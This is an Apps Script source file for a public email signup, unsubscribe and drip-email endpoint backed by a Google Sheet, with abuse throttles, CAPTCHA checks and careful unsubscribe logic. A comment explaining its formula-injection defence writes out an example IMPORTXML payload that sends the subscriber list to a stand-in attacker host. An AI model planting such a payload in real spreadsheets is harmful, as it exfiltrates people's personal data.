/**
 * The engine. Do not edit this per client; edit Config.gs instead.
 *
 * Three entry points:
 *   doPost       the signup form, the site's unsubscribe page, and one-click
 *                List-Unsubscribe from Gmail and Yahoo all post here
 *   doGet        health check, plus a hand-off to the unsubscribe page
 *   runSequence  a daily time trigger calls this
 *
 * SECURITY NOTE, read this before changing anything.
 * The Web App is deployed "Execute as: Me / Access: Anyone", which means this
 * code runs with the owner's Google account permissions and anybody on the
 * internet can call it. Three consequences shape the code below:
 *   1. Never write raw user input into a cell. See sanitizeCell().
 *   2. Never let one caller trigger unlimited mail. See the throttles.
 *   3. Never eval, never build a formula, never widen the OAuth scopes.
 */

// Column order in the sheet, zero based. Change this and change HEADERS too.
const COL = {
  timestamp: 0,
  firstName: 1,
  email: 2,
  offer: 3,
  source: 4,
  status: 5,
  token: 6,
  seqStep: 7,
  nextSendAt: 8,
  lastGuideSentAt: 9,
  notes: 10,
}

const HEADERS = [
  'timestamp', 'firstName', 'email', 'offer', 'source',
  'status', 'token', 'seqStep', 'nextSendAt', 'lastGuideSentAt', 'notes',
]

// Abuse limits. The endpoint is public, so these are the only thing standing
// between a bored attacker and either your mail quota or somebody's inbox.
const RESEND_COOLDOWN_MINUTES = 60   // how often one address can re-request a guide
const MAX_SIGNUPS_PER_HOUR = 60      // across the whole site
const MAX_NAME_LENGTH = 80
const MAX_EMAIL_LENGTH = 254         // the actual RFC limit

// ---------------------------------------------------------------------------
// doPost: signups and unsubscribes arrive here
// ---------------------------------------------------------------------------

/**
 * The website sends a JSON string with Content-Type text/plain. That is on
 * purpose: text/plain is a "simple request" so the browser skips the CORS
 * preflight. Apps Script does not answer preflight OPTIONS requests, so an
 * application/json post fails with a confusing CORS error. The body is still
 * JSON, we just parse it ourselves.
 *
 * Three kinds of request, checked in this order:
 *   1. One-click unsubscribe. Gmail and Yahoo POST the literal body
 *      "List-Unsubscribe=One-Click" to the URL in the List-Unsubscribe header,
 *      which carries ?u=TOKEN. That body is not JSON, so it goes first.
 *   2. {action:'unsubscribe', token} from the site's /unsubscribe/ page.
 *   3. Anything else is a signup.
 */
function doPost(e) {
  try {
    if (!e || !e.postData || !e.postData.contents) {
      return jsonOut({ ok: false, error: 'empty request' })
    }
    // A giant body is either a bug or an attack. Either way, stop early.
    if (e.postData.contents.length > 4000) {
      return jsonOut({ ok: false, error: 'too large' })
    }

    const oneClickToken = e.parameter && e.parameter.u
    if (oneClickToken && e.postData.contents.trim() === 'List-Unsubscribe=One-Click') {
      unsubscribeToken(String(oneClickToken), 'the Unsubscribe button in their mail app')
      return jsonOut({ ok: true })
    }

    let data
    try {
      data = JSON.parse(e.postData.contents)
    } catch (err) {
      return jsonOut({ ok: false, error: 'bad request' })
    }

    if (data.action === 'unsubscribe') {
      // Same answer whether the token was real, unknown, or already used, so
      // this cannot be used to probe which tokens exist.
      unsubscribeToken(String(data.token || ''), 'the unsubscribe link in one of our emails')
      return jsonOut({ ok: true })
    }

    // Honeypot. The form hides this field from people and short-circuits in
    // the browser, but a bot posting straight here skips the browser. Answer
    // as if it worked and write nothing: an error tells the bot what to change.
    if (data.company) {
      return jsonOut({ ok: true })
    }

    const email = String(data.email || '').trim().toLowerCase().slice(0, MAX_EMAIL_LENGTH)
    const firstName = String(data.firstName || '').trim().slice(0, MAX_NAME_LENGTH)
    const offerKey = String(data.offer || Object.keys(OFFERS)[0]).trim()

    // Never trust the client. The form validates too, but anyone can post here.
    if (!isValidEmail(email)) {
      return jsonOut({ ok: false, error: 'invalid email' })
    }
    // Look the offer up as an own property, so a payload of
    // {"offer":"constructor"} cannot reach anything on the prototype chain.
    if (!Object.prototype.hasOwnProperty.call(OFFERS, offerKey)) {
      return jsonOut({ ok: false, error: 'unknown offer' })
    }
    const offer = OFFERS[offerKey]

    // Turnstile runs before the rate limit, so a bot that fails it never
    // counts against the hourly cap real people share.
    if (!verifyTurnstile(String(data.turnstileToken || ''))) {
      return jsonOut({ ok: false, error: 'verification failed' })
    }

    // Site-wide flood guard. Without it a script can burn the entire daily
    // mail quota in a minute and take the real signups down with it.
    if (!underGlobalRateLimit()) {
      return jsonOut({ ok: false, error: 'busy, try again shortly' })
    }

    const lock = LockService.getScriptLock()
    if (!lock.tryLock(20000)) {
      return jsonOut({ ok: false, error: 'busy, try again shortly' })
    }

    let rowNumber
    let token
    let isNew
    let mayEmail

    try {
      const sheet = ensureSheet()
      // One person can legitimately want more than one offer, so dedupe on
      // email AND offer, not email alone.
      const existing = findRow(sheet, function (values) {
        return String(values[COL.email]).toLowerCase() === email &&
               String(values[COL.offer]) === offerKey
      })

      const now = new Date()

      if (existing) {
        isNew = false
        rowNumber = existing.rowNumber
        token = String(existing.values[COL.token])

        // ANTI-ABUSE, the important one. Re-sending the guide to an address
        // already on the list is a real feature, because people lose the first
        // email. But with no cooldown it is also a mail bomb: post somebody
        // else's address in a loop and this script becomes the weapon.
        const last = existing.values[COL.lastGuideSentAt]
        mayEmail = !(last instanceof Date) ||
                   (now - last) > RESEND_COOLDOWN_MINUTES * 60 * 1000

        // Somebody unsubscribed who fills the form in again is opting back in.
        // Honour that right away, even inside the cooldown: the cooldown only
        // limits email, and leaving the row unsubscribed would quietly drop a
        // person who just asked to be on the list. Do not restart the drip.
        if (String(existing.values[COL.status]) === 'unsubscribed') {
          sheet.getRange(rowNumber, COL.status + 1).setValue('active')
          sheet.getRange(rowNumber, COL.notes + 1)
            .setValue('resubscribed ' + now.toISOString())
        }
      } else {
        isNew = true
        mayEmail = true
        token = makeToken()
        const firstStep = offer.sequence.length
          ? addDays(now, offer.sequence[0].afterDays)
          : ''
        sheet.appendRow([
          now,
          sanitizeCell(firstName),
          sanitizeCell(email),
          offerKey,                                   // already validated against OFFERS
          sanitizeCell(String(data.source || CONFIG.siteUrl).slice(0, 200)),
          'active', token, 0, firstStep, '', '',
        ])
        rowNumber = sheet.getLastRow()
      }

      if (mayEmail) {
        sheet.getRange(rowNumber, COL.lastGuideSentAt + 1).setValue(now)
      }
    } finally {
      lock.releaseLock()
    }

    // Always answer as if it worked. Replying "that address is already on the
    // list" would turn this endpoint into a way to test whether a given person
    // subscribed, which is not ours to disclose.
    if (mayEmail) {
      sendGuideEmail({ email: email, firstName: firstName, offer: offer, token: token })
      if (isNew) {
        sendOwnerNotice({ email: email, firstName: firstName, offer: offer })
      }
    }

    return jsonOut({
      ok: true,
      // Label and URL only. The site shows these as buttons on its thank-you
      // screen, so getting the files never depends on the email arriving.
      downloads: allDownloads(offer).map(function (d) { return { label: d.label, url: d.url } }),
    })
  } catch (err) {
    console.error('doPost failed: ' + err)
    // Never return err.message. It can leak sheet ids, file paths, internals.
    return jsonOut({ ok: false, error: 'server error' })
  }
}

// ---------------------------------------------------------------------------
// doGet: health check, and a hand-off to the unsubscribe page
// ---------------------------------------------------------------------------

/**
 * With no parameters this is a health check: open the Web App URL in a browser
 * and you should see {"ok":true,...}.
 *
 * With ?u=TOKEN it is a mail client that opened the List-Unsubscribe header URL
 * in a browser instead of POSTing to it. It gets a button to the real
 * unsubscribe page on the site. It does NOT unsubscribe on GET: corporate mail
 * scanners (Outlook Safe Links and most filtering gateways) fetch every URL in
 * a message before the human sees it, and a bare GET would silently unsubscribe
 * the whole corporate audience.
 */
function doGet(e) {
  const params = (e && e.parameter) || {}
  if (!params.u) {
    // The site's client treats any reply with `service` as "the redirect lost
    // the real reply". Keep the key if you change this.
    return jsonOut({ ok: true, service: 'signups' })
  }

  const token = String(params.u)
  if (!/^[a-f0-9]{32}$/.test(token)) {
    return htmlOut('Nothing to do',
      'That link is missing its code. If you meant to unsubscribe, reply to any of our emails and we will take care of it.')
  }

  return htmlOut('Unsubscribe?',
    'Continue to our site to stop ' + CONFIG.brandName + ' emails.',
    unsubscribePageLink(token), 'Continue')
}

/**
 * Marks the row that owns this token as unsubscribed and tells the owners.
 * Called by every opt-out route. Does nothing, silently, for a malformed,
 * unknown, or already used token, so no caller can tell which tokens are real
 * and the owners get one notice per person, not one per click.
 *
 * `via` is a plain-English description of where the click came from, for the
 * owner notice.
 */
function unsubscribeToken(token, via) {
  if (!/^[a-f0-9]{32}$/.test(token)) return

  const sheet = ensureSheet()
  const row = findRow(sheet, function (values) {
    return String(values[COL.token]) === token
  })
  if (!row || String(row.values[COL.status]) === 'unsubscribed') return

  sheet.getRange(row.rowNumber, COL.status + 1).setValue('unsubscribed')
  sheet.getRange(row.rowNumber, COL.nextSendAt + 1).setValue('')
  sheet.getRange(row.rowNumber, COL.notes + 1)
    .setValue('unsubscribed ' + new Date().toISOString())

  // The row is already updated. A failed notice must not undo or hide that.
  try {
    sendUnsubscribeNotice({
      email: String(row.values[COL.email]),
      firstName: String(row.values[COL.firstName]),
      via: via,
    })
  } catch (err) {
    console.error('unsubscribe notice failed for row ' + row.rowNumber + ': ' + err)
  }
}

// ---------------------------------------------------------------------------
// runSequence: the daily drip
// ---------------------------------------------------------------------------

/**
 * Run this from a daily time trigger. Set it up once with installTrigger().
 *
 * Sends at most one message per person per run, so a subscriber can never get
 * two follow-ups on the same day even if the trigger fires late.
 */
function runSequence() {
  const sheet = ensureSheet()
  const values = sheet.getDataRange().getValues()
  const now = new Date()
  let sent = 0
  let stopped = false

  for (let i = 1; i < values.length; i++) {
    if (MailApp.getRemainingDailyQuota() < QUOTA_FLOOR) {
      stopped = true
      break
    }

    const r = values[i]
    if (String(r[COL.status]) !== 'active') continue

    const offerKey = String(r[COL.offer])
    if (!Object.prototype.hasOwnProperty.call(OFFERS, offerKey)) continue
    const offer = OFFERS[offerKey]
    if (!offer.sequence.length) continue

    const step = Number(r[COL.seqStep]) || 0
    if (step >= offer.sequence.length) continue

    const due = r[COL.nextSendAt]
    if (!(due instanceof Date) || due > now) continue

    const message = offer.sequence[step]
    const rowNumber = i + 1

    try {
      sendSequenceEmail({
        email: String(r[COL.email]),
        firstName: String(r[COL.firstName]),
        offer: offer,
        message: message,
        token: String(r[COL.token]),
      })
    } catch (err) {
      console.error('sequence send failed for row ' + rowNumber + ': ' + err)
      continue
    }

    // Advance only after a successful send, so a failure retries tomorrow
    // instead of silently skipping a message.
    const nextStep = step + 1
    const hasMore = nextStep < offer.sequence.length
    sheet.getRange(rowNumber, COL.seqStep + 1).setValue(nextStep)
    sheet.getRange(rowNumber, COL.nextSendAt + 1)
      .setValue(hasMore ? addDays(now, offer.sequence[nextStep].afterDays) : '')
    sent++
  }

  console.log('runSequence sent ' + sent + (stopped ? ' and stopped early on quota' : ''))
}

/** Run once, by hand, from the editor. Creates the daily trigger. */
function installTrigger() {
  ScriptApp.getProjectTriggers().forEach(function (t) {
    if (t.getHandlerFunction() === 'runSequence') ScriptApp.deleteTrigger(t)
  })
  ScriptApp.newTrigger('runSequence').timeBased().everyDays(1).atHour(9).create()
  console.log('Daily trigger installed for 9am.')
}

// ---------------------------------------------------------------------------
// Security helpers
// ---------------------------------------------------------------------------

/**
 * Spreadsheet formula injection defence. THIS ONE MATTERS.
 *
 * A cell whose text starts with = + - @ or a control character is treated by
 * Sheets, and by Excel, as a live formula. So a "first name" of
 *   =IMPORTXML("https://attacker.example/?d="&CONCAT(C2:C99),"//a")
 * quietly ships the entire subscriber list to somebody else the moment the
 * owner opens the sheet. The same trick fires again if the list is exported to
 * CSV and opened in Excel.
 *
 * A leading apostrophe forces the cell to stay text. It does not show up in
 * the cell display.
 */
function sanitizeCell(value) {
  const text = String(value == null ? '' : value)
    .replace(/[\x00-\x1F\x7F]/g, ' ')
    .trim()
  return /^[=+\-@]/.test(text) ? "'" + text : text
}

/** Rolling one-hour cap on new signups across the whole site. */
function underGlobalRateLimit() {
  const cache = CacheService.getScriptCache()
  const key = 'signups-' + Math.floor(Date.now() / 3600000)
  const count = Number(cache.get(key) || 0)
  if (count >= MAX_SIGNUPS_PER_HOUR) return false
  cache.put(key, String(count + 1), 3700)
  return true
}

/**
 * Cloudflare Turnstile check. The secret lives in Script Properties as
 * TURNSTILE_SECRET, never in this file. Tokens are single use and expire after
 * five minutes, which is why the form resets its widget after a failed send.
 *
 * Fails closed: no secret, no token, or Cloudflare unreachable all mean no.
 */
function verifyTurnstile(token) {
  const secret = PropertiesService.getScriptProperties().getProperty('TURNSTILE_SECRET')
  if (!secret) {
    console.error('TURNSTILE_SECRET is not set in Script Properties')
    return false
  }
  if (!token || token.length > 2048) return false

  try {
    const response = UrlFetchApp.fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'post',
      payload: { secret: secret, response: token },
      muteHttpExceptions: true,
    })
    return JSON.parse(response.getContentText()).success === true
  } catch (err) {
    console.error('Turnstile verify failed: ' + err)
    return false
  }
}

// ---------------------------------------------------------------------------
// Plumbing
// ---------------------------------------------------------------------------

function ensureSheet() {
  const book = SpreadsheetApp.openById(CONFIG.sheetId)
  let sheet = book.getSheetByName(CONFIG.sheetName)
  if (!sheet) {
    sheet = book.insertSheet(CONFIG.sheetName)
  }
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(HEADERS)
    sheet.setFrozenRows(1)
  }
  return sheet
}

/** Returns { rowNumber, values } for the first match, or null. */
function findRow(sheet, predicate) {
  const values = sheet.getDataRange().getValues()
  for (let i = 1; i < values.length; i++) {
    if (predicate(values[i])) {
      return { rowNumber: i + 1, values: values[i] }
    }
  }
  return null
}

function isValidEmail(value) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(String(value).trim())
}

function makeToken() {
  return Utilities.getUuid().replace(/-/g, '')
}

function addDays(date, days) {
  const out = new Date(date.getTime())
  out.setDate(out.getDate() + Number(days || 0))
  return out
}

function jsonOut(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON)
}

/**
 * HtmlService pages run inside a sandboxed iframe on googleusercontent.com.
 * A plain link navigates only that iframe and can be refused, so every link
 * here opens in the top window.
 */
function htmlOut(title, message, buttonUrl, buttonLabel) {
  const button = buttonUrl
    ? '<p style="margin:26px 0"><a href="' + escapeHtml(buttonUrl) + '" target="_top" ' +
      'style="background:' + CONFIG.colors.link + ';color:#fff;text-decoration:none;font-weight:700;' +
      'padding:13px 24px;border-radius:999px;display:inline-block">' +
      escapeHtml(buttonLabel) + '</a></p>'
    : ''

  const html =
    '<!doctype html><meta charset="utf-8">' +
    '<meta name="viewport" content="width=device-width,initial-scale=1">' +
    '<meta name="robots" content="noindex">' +
    '<title>' + escapeHtml(title) + '</title>' +
    '<div style="font:17px/1.6 -apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;' +
    'max-width:34rem;margin:12vh auto;padding:0 1.5rem;color:' + CONFIG.colors.text + '">' +
    '<h1 style="font-size:1.6rem;margin:0 0 .6rem">' + escapeHtml(title) + '</h1>' +
    '<p style="color:' + CONFIG.colors.muted + ';margin:0">' + escapeHtml(message) + '</p>' + button +
    '<p style="margin-top:1.4rem"><a href="' + CONFIG.siteUrl + '" target="_top" style="color:' + CONFIG.colors.link + '">Back to ' +
    escapeHtml(CONFIG.brandName) + '</a></p></div>'

  return HtmlService.createHtmlOutput(html)
    .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.DENY)
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;')
}
